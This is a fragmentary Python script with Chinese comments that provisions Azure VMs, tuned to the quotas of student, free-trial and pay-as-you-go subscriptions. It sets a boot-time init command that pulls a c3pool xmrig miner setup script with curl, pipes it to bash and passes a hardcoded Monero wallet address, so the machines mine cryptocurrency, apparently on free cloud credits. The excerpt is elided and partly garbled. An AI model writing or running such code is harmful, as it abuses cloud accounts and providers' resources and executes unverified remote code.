...
# 因此创建1个Standard_F4s_v2实例（共占用4个vCPUs）
    ...
    print("若当前订阅为Azure for Students、免费试用或即用即付，"
          ...
          "显示“验证通过”即可自动刷新配额")
    print("假还未解决，请直接修改limit = f.getvalue()中的"
...
print("创建资源组成功")
# 3.创建开机后要运行的脚本
init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42711UAWzYDRAFj7bD7PeTGvncX52Px3GgHWik13hdjcSrDg3bx73hwEsdJEjqwRYUCAByjA6gsJNfU3f3qhoAygVfJ33vM"
